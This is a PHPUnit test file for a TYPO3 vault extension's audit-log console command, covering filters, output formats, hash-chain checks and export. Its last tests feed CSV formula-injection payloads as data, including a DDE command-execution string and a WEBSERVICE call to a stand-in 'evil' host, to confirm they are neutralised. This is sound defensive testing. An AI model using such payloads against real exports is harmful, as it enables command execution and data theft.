<?php

/*
 * Copyright (c) 2025-2026 Netresearch DTT GmbH
 * SPDX-License-Identifier: GPL-2.0-or-later
 */

declare(strict_types=1);

namespace Netresearch\NrVault\Tests\Unit\Command;

use Netresearch\NrVault\Audit\AuditChainAnchorStoreInterface;
use Netresearch\NrVault\Audit\AuditLogEntry;
use Netresearch\NrVault\Audit\AuditLogServiceInterface;
use Netresearch\NrVault\Audit\HashChainVerificationResult;
use Netresearch\NrVault\Command\VaultAuditCommand;
use Netresearch\NrVault\Exception\VaultException;
use Netresearch\NrVault\Tests\Unit\TestCase;
use org\bovigo\vfs\vfsStream;
use PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\MockObject\MockObject;
use Symfony\Component\Console\Application;
use Symfony\Component\Console\Tester\CommandTester;
use TYPO3\CMS\Core\Database\ConnectionPool;

#[CoversClass(VaultAuditCommand::class)]
#[AllowMockObjectsWithoutExpectations]
final class VaultAuditCommandTest extends TestCase
{
    /** vfs path the CSV export tests write to. */
    private const EXPORT_PATH = 'exports/audit.csv';

    private const IP_ADDRESS = '127.0.0.1';

    private AuditLogServiceInterface&MockObject $auditLogService;

    private AuditChainAnchorStoreInterface&MockObject $anchorStore;

    private ConnectionPool&MockObject $connectionPool;

    private CommandTester $commandTester;

    protected function setUp(): void
    {
        parent::setUp();

        $this->auditLogService = $this->createMock(AuditLogServiceInterface::class);
        $this->anchorStore = $this->createMock(AuditChainAnchorStoreInterface::class);
        $this->connectionPool = $this->createMock(ConnectionPool::class);

        $command = new VaultAuditCommand($this->auditLogService, $this->anchorStore, $this->connectionPool);

        $application = new Application();
        $application->addCommand($command);

        $this->commandTester = new CommandTester($command);
    }

    #[Test]
    public function hasCorrectName(): void
    {
        $command = new VaultAuditCommand($this->auditLogService, $this->anchorStore, $this->connectionPool);

        self::assertSame('vault:audit', $command->getName());
    }

    #[Test]
    public function showsInfoWhenNoEntriesFound(): void
    {
        $this->auditLogService
            ->method('query')
            ->willReturn([]);

        $exitCode = $this->commandTester->execute([]);

        self::assertSame(0, $exitCode);
        self::assertStringContainsString('No audit entries found', $this->commandTester->getDisplay());
    }

    #[Test]
    public function outputsTableFormat(): void
    {
        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'test-secret',
            'action' => 'read',
            'success' => 1,
            'actor_uid' => 1,
            'actor_username' => 'admin',
            'actor_type' => 'be_user',
            'ip_address' => self::IP_ADDRESS,
            'entry_hash' => 'abc123def456',
            'previous_hash' => 'prev123',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exitCode = $this->commandTester->execute([]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertStringContainsString('test-secret', $display);
        self::assertStringContainsString('read', $display);
        self::assertStringContainsString('admin', $display);
        self::assertStringContainsString('Total: 1 entries', $display);
    }

    #[Test]
    public function outputsJsonFormat(): void
    {
        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'json-test',
            'action' => 'create',
            'success' => 1,
            'actor_uid' => 2,
            'actor_username' => 'editor',
            'actor_type' => 'be_user',
            'ip_address' => '192.168.1.1',
            'entry_hash' => 'hash123',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exitCode = $this->commandTester->execute([
            '--format' => 'json',
        ]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertJson($display);
        self::assertStringContainsString('"secretIdentifier": "json-test"', $display);
    }

    #[Test]
    public function outputsCsvFormat(): void
    {
        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'csv-test',
            'action' => 'delete',
            'success' => 0,
            'actor_uid' => 1,
            'actor_username' => 'admin',
            'actor_type' => 'be_user',
            'ip_address' => '10.0.0.1',
            'entry_hash' => 'csvhash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exitCode = $this->commandTester->execute([
            '--format' => 'csv',
        ]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertStringContainsString('timestamp,secret_identifier,action', $display);
        self::assertStringContainsString('csv-test,delete,0', $display);
    }

    #[Test]
    public function filtersbyIdentifier(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null && $filter->secretIdentifier === 'filtered-secret'),
                50,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--identifier' => 'filtered-secret',
        ]);
    }

    #[Test]
    public function filtersByAction(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null && $filter->action === 'rotate'),
                50,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--action' => 'rotate',
        ]);
    }

    #[Test]
    public function filtersByActor(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null && $filter->actorUid === 42),
                50,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--actor' => '42',
        ]);
    }

    #[Test]
    public function verifyHashChainSuccess(): void
    {
        $this->auditLogService
            ->method('verifyHashChain')
            ->willReturn(HashChainVerificationResult::valid());

        $exitCode = $this->commandTester->execute([
            '--verify' => true,
        ]);

        self::assertSame(0, $exitCode);
        self::assertStringContainsString('Hash chain is valid', $this->commandTester->getDisplay());
    }

    #[Test]
    public function verifyHashChainFailure(): void
    {
        $this->auditLogService
            ->method('verifyHashChain')
            ->willReturn(HashChainVerificationResult::invalid([123 => 'Hash mismatch']));

        $exitCode = $this->commandTester->execute([
            '--verify' => true,
        ]);

        self::assertSame(1, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertStringContainsString('FAILED', $display);
        self::assertStringContainsString('123', $display);
        self::assertStringContainsString('Hash mismatch', $display);
    }

    #[Test]
    public function verifyHashChainDisplaysWarnings(): void
    {
        $this->auditLogService
            ->method('verifyHashChain')
            ->willReturn(HashChainVerificationResult::valid([5 => 'HMAC key epoch boundary: 0 -> 1']));

        $exitCode = $this->commandTester->execute([
            '--verify' => true,
        ]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertStringContainsString('Hash chain is valid', $display);
        self::assertStringContainsString('1 warning(s) detected', $display);
        self::assertStringContainsString('epoch boundary', $display);
    }

    #[Test]
    public function exportsToFile(): void
    {
        vfsStream::setup('exports');

        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'exported',
            'action' => 'read',
            'success' => 1,
            'actor_uid' => 1,
            'actor_username' => 'admin',
            'actor_type' => 'be_user',
            'ip_address' => self::IP_ADDRESS,
            'entry_hash' => 'exporthash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exportFile = vfsStream::url('exports/audit.json');

        $exitCode = $this->commandTester->execute([
            '--export' => $exportFile,
        ]);

        self::assertSame(0, $exitCode);
        self::assertFileExists($exportFile);
        $content = file_get_contents($exportFile);
        self::assertJson($content);
        self::assertStringContainsString('exported', $content);
    }

    #[Test]
    public function appliesLimit(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(null, 25, 0)
            ->willReturn([]);

        $this->commandTester->execute([
            '--limit' => '25',
        ]);
    }

    #[Test]
    public function handlesVaultException(): void
    {
        $this->auditLogService
            ->method('query')
            ->willThrowException(new VaultException('Audit query failed'));

        $exitCode = $this->commandTester->execute([]);

        self::assertSame(1, $exitCode);
        self::assertStringContainsString('Audit query failed', $this->commandTester->getDisplay());
    }

    #[Test]
    public function filtersBySinceDate(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null && $filter->since !== null),
                50,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--since' => '2024-01-01',
        ]);
    }

    #[Test]
    public function filtersByUntilDate(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null && $filter->until !== null),
                50,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--until' => '2024-12-31 23:59:59',
        ]);
    }

    #[Test]
    public function filtersBySuccessStatus(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null && $filter->success === true),
                50,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--success' => 'true',
        ]);
    }

    #[Test]
    public function showsFailedEntriesInTable(): void
    {
        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'failed-secret',
            'action' => 'read',
            'success' => 0,
            'actor_uid' => 1,
            'actor_username' => 'hacker',
            'actor_type' => 'be_user',
            'ip_address' => '192.168.1.100',
            'entry_hash' => 'failhash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exitCode = $this->commandTester->execute([]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertStringContainsString('failed-secret', $display);
        self::assertStringContainsString('✗', $display);
    }

    #[Test]
    public function outputsMultipleEntriesAsJson(): void
    {
        $entries = [
            AuditLogEntry::fromDatabaseRow([
                'uid' => 1,
                'crdate' => 1704067200,
                'secret_identifier' => 'secret-1',
                'action' => 'create',
                'success' => 1,
                'actor_uid' => 1,
                'actor_username' => 'admin',
                'actor_type' => 'be_user',
                'ip_address' => self::IP_ADDRESS,
                'entry_hash' => 'hash1',
                'previous_hash' => '',
                'context' => '{}',
            ]),
            AuditLogEntry::fromDatabaseRow([
                'uid' => 2,
                'crdate' => 1704153600,
                'secret_identifier' => 'secret-2',
                'action' => 'read',
                'success' => 1,
                'actor_uid' => 2,
                'actor_username' => 'editor',
                'actor_type' => 'be_user',
                'ip_address' => '10.0.0.1',
                'entry_hash' => 'hash2',
                'previous_hash' => 'hash1',
                'context' => '{}',
            ]),
        ];

        $this->auditLogService
            ->method('query')
            ->willReturn($entries);

        $exitCode = $this->commandTester->execute([
            '--format' => 'json',
        ]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertJson($display);
        $decoded = json_decode($display, true);
        self::assertCount(2, $decoded);
    }

    #[Test]
    public function handlesInvalidSinceDate(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(null, 50, 0)
            ->willReturn([]);

        $this->commandTester->execute([
            '--since' => 'not-a-valid-date',
        ]);
    }

    #[Test]
    public function combinesMultipleFilters(): void
    {
        $this->auditLogService
            ->expects($this->once())
            ->method('query')
            ->with(
                $this->callback(fn ($filter): bool => $filter !== null
                    && $filter->secretIdentifier === 'multi-filter'
                    && $filter->action === 'read'
                    && $filter->actorUid === 5),
                100,
                0,
            )
            ->willReturn([]);

        $this->commandTester->execute([
            '--identifier' => 'multi-filter',
            '--action' => 'read',
            '--actor' => '5',
            '--limit' => '100',
        ]);
    }

    #[Test]
    public function exportsToCsvFormat(): void
    {
        vfsStream::setup('exports');

        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'csv-export',
            'action' => 'read',
            'success' => 1,
            'actor_uid' => 1,
            'actor_username' => 'admin',
            'actor_type' => 'be_user',
            'ip_address' => self::IP_ADDRESS,
            'entry_hash' => 'csvhash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exportFile = vfsStream::url(self::EXPORT_PATH);

        $exitCode = $this->commandTester->execute([
            '--export' => $exportFile,
            '--format' => 'csv',
        ]);

        self::assertSame(0, $exitCode);
        self::assertFileExists($exportFile);
        $content = file_get_contents($exportFile);
        self::assertStringContainsString('csv-export', $content);
    }

    #[Test]
    public function csvConsoleOutputNeutralizesFormulaInjection(): void
    {
        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => '=1+1',
            'action' => 'read',
            'success' => 1,
            'actor_uid' => 1,
            'actor_username' => '@SUM(A1)',
            'actor_type' => 'be_user',
            'ip_address' => '10.0.0.1',
            'entry_hash' => 'csvhash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exitCode = $this->commandTester->execute([
            '--format' => 'csv',
        ]);

        self::assertSame(0, $exitCode);
        $display = $this->commandTester->getDisplay();
        self::assertStringContainsString("'=1+1", $display);
        self::assertStringContainsString("'@SUM(A1)", $display);
        self::assertStringNotContainsString(',=1+1', $display);
        self::assertStringNotContainsString(',@SUM(A1)', $display);
    }

    #[Test]
    public function csvExportFileNeutralizesFormulaInUserAgentAndRequestId(): void
    {
        vfsStream::setup('exports');

        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'benign_id',
            'action' => 'read',
            'success' => 1,
            'actor_uid' => 1,
            'actor_username' => 'admin',
            'actor_type' => 'be_user',
            'ip_address' => '10.0.0.1',
            'user_agent' => "=cmd|'/c calc'!A1",
            'request_id' => '@SUM(1+1)',
            'entry_hash' => 'hash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exportFile = vfsStream::url(self::EXPORT_PATH);

        $exitCode = $this->commandTester->execute([
            '--export' => $exportFile,
            '--format' => 'csv',
        ]);

        self::assertSame(0, $exitCode);
        $content = (string) file_get_contents($exportFile);
        self::assertStringContainsString("'=cmd|'/c calc'!A1", $content);
        self::assertStringContainsString("'@SUM(1+1)", $content);
        self::assertStringContainsString('benign_id', $content);
        self::assertStringNotContainsString("'benign_id", $content);
    }

    #[Test]
    public function csvExportFileDoesNotBreakOutOfQuotedCellOnBackslashQuote(): void
    {
        vfsStream::setup('exports');

        // Literal bytes: x\",=WEBSERVICE("http://evil/"&A1),y
        // With fputcsv's proprietary escape ('\\') the \" sequence is written
        // through unchanged and closes the quoted cell, so =WEBSERVICE(...)
        // becomes a cell of its own that the formula sanitizer never saw.
        $payload = 'x\\",=WEBSERVICE("http://evil/"&A1),y';

        $entry = AuditLogEntry::fromDatabaseRow([
            'uid' => 1,
            'crdate' => 1704067200,
            'secret_identifier' => 'benign_id',
            'action' => 'read',
            'success' => 1,
            'actor_uid' => 1,
            'actor_username' => 'admin',
            'actor_type' => 'be_user',
            'ip_address' => '10.0.0.1',
            'user_agent' => $payload,
            'request_id' => '',
            'entry_hash' => 'hash',
            'previous_hash' => '',
            'context' => '{}',
        ]);

        $this->auditLogService
            ->method('query')
            ->willReturn([$entry]);

        $exportFile = vfsStream::url(self::EXPORT_PATH);

        $exitCode = $this->commandTester->execute([
            '--export' => $exportFile,
            '--format' => 'csv',
        ]);

        self::assertSame(0, $exitCode);
        $content = (string) file_get_contents($exportFile);

        // Emitted bytes: the embedded double quote is RFC-4180 doubled ("")
        // instead of being left as the backslash-escaped \" of the vulnerable
        // output, so the cell stays closed.
        self::assertStringContainsString('"x\\"",=WEBSERVICE(""http://evil/""&A1),y"', $content);
        self::assertStringNotContainsString('"x\\",=WEBSERVICE(', $content);

        // Strict re-parse (no proprietary escaping): the payload must survive
        // as exactly one cell and must not produce any formula cell.
        $rows = $this->parseCsvStrict($content);
        self::assertCount(2, $rows);

        $columnIndex = array_search('userAgent', $rows[0], true);
        self::assertIsInt($columnIndex);
        self::assertSame($payload, $rows[1][$columnIndex]);
        self::assertSameSize($rows[0], $rows[1]);

        foreach ($rows[1] as $cell) {
            self::assertStringStartsNotWith('=', (string) $cell);
        }
    }

    /**
     * Parse CSV without PHP's proprietary backslash escaping (RFC 4180 only).
     *
     * @return array<int, array<int, string|null>>
     */
    private function parseCsvStrict(string $csv): array
    {
        $handle = fopen('php://memory', 'r+');
        self::assertIsResource($handle);
        fwrite($handle, $csv);
        rewind($handle);

        $rows = [];
        while (($row = fgetcsv($handle, escape: '')) !== false) {
            $rows[] = $row;
        }

        fclose($handle);

        return $rows;
    }
}
